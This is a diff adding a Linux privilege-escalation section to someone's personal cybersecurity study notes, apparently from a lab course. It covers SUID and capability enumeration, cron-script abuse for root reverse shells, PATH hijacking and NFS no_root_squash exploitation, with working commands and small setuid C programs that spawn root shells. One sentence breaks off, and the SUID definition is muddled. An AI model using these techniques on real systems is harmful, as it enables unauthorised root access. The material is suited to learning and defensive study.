@@ -49,6 +49,7 @@ Collection of notes regarding Cybersecurity vocabulary for my personal reference
         + [SQLi](#sqli)
 + [Privilege Escalation](#privilege-escalation)
     + [Shell Tools](#shell-tools)
+    + [Linux Privilege Escalation](#linux-privilege-escalation)
 ### Offensive Security Tools
 + [Metasploit](#metasploit)
 + [Burp Suite](#burp-suite)
@@ -3680,3 +3681,117 @@ Exploit code can be transferred to the target system using *SimpleHTTPServer* Py
 
 ### Sudo
 A user can check its root privileges using *sudo -l*.
+
+### SUID
+Permissions (i.e. read, write, execute) are given by changing a user's SUID and SGID. These allow files to be executed with the permission level of a file/group owner. Note: an "s" bit will be included (e.g. -rwsr-xr-x)
+
+```
+# List files that have SUID/SGID bits set
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+A good practice is to compare executables with [GTFOBins](https://gtfobins.github.io)
+
+E.g. a set SUID bit for *nano* allows creation, editing, and read files at a higher 
+
+### Capabilities
+Capabilities manage privileges for a process or binary, which administrators can give instead of giving a user higher privileges.
+
+```
+# List enabled capabilities while ignoring errors
+getcap -r / 2>/dev/null
+```
+
+### Cron Jobs
+Cron jobs run scripts or binaries at specified times. By default, they run with the privilege of their owners and not the current user. If there are scheduled task that runs with root privileges, the script can be changed and ran with root privileges.
+
+```
+# Read the crob jobs file under /etc/crontab
+cat /etc/crontab
+```
+
+If current user can access scripts, these can be modified to create reverse shell with root access. Note: always prefer to start reverse shells (i.e. not bind shells) to prevent compromising system integrity
+
+This vector is ideal in the following scenarios:
++ System admins need to run scripts at regular intervals
++ Cron jobs are created to achieve this
++ Scripts become useless and deleted
++ Relevant cron jobs are not cleaned
+
+### PATH
+*PATH* is an environmental variable that tells the OS where to search for executables. *echo $PATH* will return the directories.
+
+Before trying this vector, it is worth noting the following:
+1. What folders are located under $PATH?
+2. Does current user have write privileges for these folders?
+3. Can $PATH be modified?
+4. Is there a script/application you can use that will be affected by this vulnerability?
+
+Note: for the following example, this script will be used
+
+```
+#include<unistd.h>
+void main(){
+    setuid(0);
+    setgid(0);
+    system("thm");
+}
+```
+
+E.g. simple PATH exploit
+
+```
+# Compile script
+gcc path_exp.c -o path -w
+
+# Set SUID bit
+chmod u+s path
+
+# Search for writeable folders
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+# Add /tmp to PATH
+export PATH=/tmp:$PATH
+
+# Add an executable named "thm" that starts a shell
+cd /tmp
+echo "/bin/bash" > thm
+chmod 777 thm
+
+# Execute the original script
+./path
+
+```
+
+### NFS
+*Network File Sharing (NFS)* can be a vector via shared folders and remote management. This means that attacks can be done externally (i.e. without logging as user). 
+
+The initial step is to search for "no_root_squash" options, which strips any root privileges. The NFS configuration is kept in */etc/exports*. 
+
+```
+# Enumerate mountable shares from attacking machine
+showmount -e [IP_ADDRESS]
+
+# Create a working directory
+mkdir /tmp/shared
+
+# mount to one of the no_root_squash shares
+mount -o rw [IP_ADDRESS]:[FOLDER] /tmp/shared
+
+# Create simple executable that runs /bin/bash
+nano nfs.c
+int main(){
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+
+# Compile the code
+gcc nfs.c -o nfs -w
+
+# Set SUID bit
+chmod +s nfs
+```
+
+At this point, the script can be seen on the shared folder (i.e. no need to transfer). 
